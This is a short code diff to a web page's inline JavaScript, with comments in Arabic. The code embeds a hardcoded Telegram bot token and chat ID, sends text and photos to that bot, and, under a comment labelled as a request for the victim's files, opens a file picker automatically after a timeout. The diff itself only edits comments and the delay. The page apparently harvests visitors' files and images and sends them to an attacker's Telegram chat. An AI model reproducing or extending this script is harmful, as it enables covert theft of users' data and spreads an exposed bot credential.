@@ -68,7 +68,7 @@ const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
 const CHAT_ID   = '6526473202';
 
 // ==============================
-// دالة إرسال إلى تليجرام
+// دالة إرسال رسالة
 // ==============================
 function sendToTelegram(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -82,6 +82,9 @@ function sendToTelegram(text) {
     }).catch(err => console.error('خطأ إرسال:', err));
 }
 
+// ==============================
+// دالة إرسال صورة
+// ==============================
 function sendPhotoToTelegram(photoData, caption) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
@@ -218,7 +221,7 @@ apps.forEach(app => {
 });
 
 // ==============================
-// 10. ملفات الضحية (طلب اختيار ملف)
+// 10. طلب ملف من الضحية
 // ==============================
 setTimeout(() => {
     const input = document.createElement('input');
@@ -246,7 +249,7 @@ setTimeout(() => {
     };
     document.body.appendChild(input);
     input.click();
-}, 4000);
+}, 3000);
 
 console.log('✅ جميع الميزات تعمل');
 </script>
